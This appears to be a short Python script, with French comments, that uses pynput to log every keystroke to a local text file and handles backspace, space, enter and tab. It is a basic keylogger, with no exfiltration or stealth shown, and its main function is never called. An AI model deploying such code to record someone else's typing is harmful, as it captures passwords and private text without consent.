from pynput import keyboard


class KeyboardListener:
    def __init__(self, file_path):
        self.file_path = file_path

    def handle_key_press(self, key):
        with open(self.file_path, 'a') as file:
            try:
                file.write(key.char)
                file.flush()
            except AttributeError:
                if key == keyboard.Key.backspace:
                    # Lire le contenu actuel du fichier
                    with open(self.file_path, 'r') as f:
                        content = f.read()
                    # Supprimer le dernier caractère si possible
                    if content:
                        content = content[:-1]
                    # Réécrire le contenu modifié dans le fichier
                    with open(self.file_path, 'w') as f:
                        f.write(content)
                elif key == keyboard.Key.space:
                    file.write(' ')
                elif key == keyboard.Key.enter:
                    file.write('\n')
                elif key == keyboard.Key.tab:
                    file.write('\t')
                else:
                    file.write(f'Spéciale {key}')

    def start_listening(self):
        with keyboard.Listener(on_press=self.handle_key_press) as listener:
            listener.join()


def main():
    listener = KeyboardListener('output.txt')
    listener.start_listening()

